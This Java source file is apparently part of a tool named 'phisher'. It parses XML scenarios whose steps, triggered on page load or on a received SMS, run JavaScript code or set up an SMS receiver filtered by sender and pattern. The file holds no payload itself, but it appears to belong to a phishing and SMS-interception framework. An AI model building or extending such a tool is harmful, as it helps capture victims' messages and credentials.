package pl.jasiun.phisher;

import java.io.ByteArrayInputStream;
import java.io.IOException;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;

import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;

import pl.jasiun.phisher.scenario.Action;
import pl.jasiun.phisher.scenario.JavascriptAction;
import pl.jasiun.phisher.scenario.PrepareSmsReciverAction;
import pl.jasiun.phisher.scenario.Scenario;
import pl.jasiun.phisher.scenario.Step;
import pl.jasiun.phisher.scenario.Step.Trigger;

public class ScenarioParser {
	
	String pernamentCode;
	private Scenario scenario;

	public ScenarioParser(byte[] scenarion) {
		try {
			DocumentBuilder documentBuilder = DocumentBuilderFactory.newInstance().newDocumentBuilder();
			Document document = documentBuilder.parse(new ByteArrayInputStream(scenarion));
			Element scenarionElement = document.getDocumentElement();
			pernamentCode = scenarionElement.getAttribute("permanentCode");

			parseScenario(scenarionElement);
			
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (ParserConfigurationException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	private void parseScenario(Element scenarionElement) throws Exception {
		scenario = new Scenario();
		
		NodeList stepNodes = scenarionElement.getChildNodes();
		for (int i = 0; i < stepNodes.getLength(); ++i) {
			Node stepNode = stepNodes.item(i);
			if(stepNode.getNodeType() == Node.ELEMENT_NODE) {				
				scenario.addStep(parseStep((Element)stepNode));
			}
		};
	}

	private Step parseStep(Element stepElement) throws Exception {
		Trigger trigger = attributeToTrigger(stepElement.getAttribute("trigger"));
		Step step = new Step(scenario, trigger);
		NodeList actionNodes = stepElement.getChildNodes();
		for (int i = 0; i < actionNodes.getLength(); ++i) {
			Node actionNode = actionNodes.item(i);
			if(actionNode.getNodeType() == Node.ELEMENT_NODE) {				
				step.addAction(parseAction((Element)actionNode));
			}
		};
		
		return step;
	}
	
	private Trigger attributeToTrigger(String attribute) throws Exception {
		if(attribute.equals("PAGE_READY"))
			return Trigger.PAGE_READY;
		else if(attribute.equals("SMS_RECIVED_AND_PAGE_READY"))
			return Trigger.SMS_RECIVED_AND_PAGE_READY;
		
		throw new Exception("Unknown trigger attribute type!");
	}

	private Action parseAction(Element actionElement) throws Exception {
		String nodeName = actionElement.getNodeName();
		if(nodeName.equals("javascriptAction")) {
			return parseJavascriptAction(actionElement);
		} else if(nodeName.equals("prepareSmsReciverAction")) {
			return parsePrepareSmsReciverAction(actionElement);
		}
		throw new Exception("Unknown action node type!");
	}

	private Action parseJavascriptAction(Element actionElement) {
		return new JavascriptAction(scenario, actionElement.getAttribute("code"));
	}

	private Action parsePrepareSmsReciverAction(Element actionElement) {
		return new PrepareSmsReciverAction(scenario, actionElement.getAttribute("sender"), actionElement.getAttribute("pattern"));
	}

	public Scenario getScenario(StageManager stageManager) {
		scenario.setStageManager(stageManager);
		return scenario;
	}

	public String getPermanentCode() {
		return pernamentCode;
	}

}
